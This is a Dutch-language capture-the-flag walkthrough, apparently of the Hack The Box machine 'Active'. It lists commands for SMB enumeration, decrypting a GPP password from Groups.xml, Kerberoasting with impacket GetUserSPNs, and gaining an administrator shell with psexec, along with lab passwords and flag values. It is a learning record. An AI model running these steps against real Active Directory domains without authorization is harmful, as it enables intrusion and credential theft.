
Ik ga eerst starten met het uitvoeren van het NMAP commando, voor het kijken welke services er allemaal openstaan.

```
nmap -p- -sCV 10.129.109.109 -vvvv
```

![image-20250106-185818.png](77791235.png)

Ik kan door de scan zien dat het een ad domain joined computer is.

![image-20250106-190013.png](77824009.png)

Aan de hand van het smbmap commando kan je zien dat we alleen de replication disk kunnen gaan bekijken.

```
smbmap -H 10.129.109.109
```

![image-20250106-190321.png](77692933.png)

als we met de smbclient zullen gaan connecteren kan je zien dat er documenten te vinden zijn binnen de disk Replication. Dit zullen we gaan doen aan de hand van het volgende commando:

```
smbclient \\\\10.129.109.109\\Replication
```

![image-20250106-191700.png](77791246.png)

Binnen het volgende path vinden we een groups.xml file.

![image-20250106-192147.png](77758481.png)

Als ik ben gaan kijken in deze file hebben we hashed password zitten. We zullen deze gaan decrypteren aan de hand van het volgende commando.

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

![image-20250106-192422.png](77791255.png)![image-20250106-193615.png](77791263.png)

Dit is het wachtwoord en hiermee zullen we kunnen inloggen met de volgende gegevens op de machine.

- username: SVC_TGS
    
- password: GPPstillStandingStrong2k18
    

Ik ben door deze gegevens geconnecteerd met de smb server door het volgende commando:

```
smbclient \\\\10.129.109.109\\Users -U SVC_TGS -p 'GPPstillStandingStrong2k18'
```

![image-20250106-194447.png](77758492.png)

als we daar gaan kijken welke sub directeries er zijn. Zullen we zien dat de user SVC_TGS er is als we daar naar toe gaan en naar de desktop hebben we daar onze eerste user flag.

user flag c68d05aa2825061c0df984a7eb9ae1fe

![image-20250106-194649.png](77824022.png)

Ik heb deze naar de eigen device gekopieerd en dan het cat commando gedaan.

![image-20250106-194723.png](77692950.png)

we gaan deze commando’s gaan uitvoeren zodat we een exploit kunnen gaan uitvoeren voor het vinden van de andere user.

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/
python setup.py install
```

eens dat it geinstalleerd geweest is kunnen we het volgende commando gaan uitvoeren en krijgen we de volgende output.

```
./GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.109.109 -request
```

dan krijgen we een hash als we deze gaan decrypteren dan krijgen we het volgende password voor de user administrator.

- username administrator
    
- password: Ticketmaster1968
    

We zullen nu aan de hand van de volgende code de admin shell gaan verkrijgen.

```
./psexec.py active.htb/Administrator:Ticketmaster1968@active.htb
```

![image-20250106-201229.png](77692967.png)

Als we nu naar het volgende path gaan en dan het volgende commando gebruiken dan kunnen we de root flag zien.

```
cd C:Users\Administrator\Desktop

type root.txt

```
![image-20250106-201350.png](77791277.png)

Root Flag: 6b7438d5b61b0453927ba83ddc065589

![image-20250106-201420.png](77758505.png)

Nu hebben we dus bij deze, deze machine gehacked.

![image-20250106-201159.png](77692961.png)
